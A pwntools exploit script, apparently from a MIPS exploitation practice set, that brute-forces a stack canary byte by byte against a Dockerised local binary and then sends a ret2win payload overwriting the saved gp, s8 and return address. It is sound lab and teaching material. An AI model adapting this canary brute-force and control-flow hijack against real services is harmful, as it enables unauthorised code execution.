from pwn import *


# initialize the binary
build = 'mips64r6-glibc-n32'
binary = "mips64r6_pie_n32"
elf = context.binary = ELF("../binaries/"+binary, checksec=False)
docker = ELF('/usr/bin/docker',checksec=False)

gs = """
set architecture mips:isa32r2
break main
break *handle_client+144
set follow-fork-mode child
continue
"""

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p_server = docker.process(
        ['run','-i','--rm','-v','../binaries:/target/ctf','-p','7777:7777',
        '-p','1234:1234',
        '--name',binary,f'legoclones/mips-pwn:{build}','chroot','/target',
        '/qemu','-g','1234','/ctf/'+binary])
    sleep(1)    # wait for server to start
    gdb.attach(("127.0.0.1",1234), gdbscript=gs, exe="../binaries/"+binary)
else:
    p_server = docker.process(
        ['run','-i','--rm','-v','../binaries:/target/ctf','-p','7777:7777',
        '--name',binary,f'legoclones/mips-pwn:{build}','chroot','/target',
        '/qemu','/ctf/'+binary])
    sleep(1)    # wait for server to start



### EXPLOIT ###
canary = b''
last_byte = 0

while len(canary) != 4:
    # spawn another instance
    p = remote("localhost", 7777)

    payload = flat(
        b'a'*0x24,
        canary,
        int.to_bytes(last_byte)
    )
    p.send(payload)

    # see if the byte was correct or not
    try:
        if p.recvuntil(b'Goodbye!', timeout=2) == b"":
            print("timeout")
            raise EOFError()
        canary += int.to_bytes(last_byte)
        print(f'Canary so far: {canary.hex()}')
        last_byte = 0
    except EOFError:
        last_byte += 1
        if last_byte > 0xff:
            print("Couldn't find byte :(")
            print('[+] Removing docker container...')
            subprocess.getoutput('docker stop ' + binary+' && docker rm ' + binary)
            exit(1)
    
    # close
    p.close()



### RET2WIN ###
p = remote("localhost", 7777)

# get leak
win_addr = int(p.readline().strip(),16)

payload = flat(
    b'a'*0x24,
    canary,
    b'b'*8,
    p64(win_addr+0x274d8),          # gp
    p64(win_addr+0x203c8),          # s8
    p64(win_addr+32)                # ra
)
p.send(payload)
p.interactive()


### CLEANUP ###
print('[+] Removing docker container...')
subprocess.getoutput('docker stop ' + binary+' && docker rm ' + binary)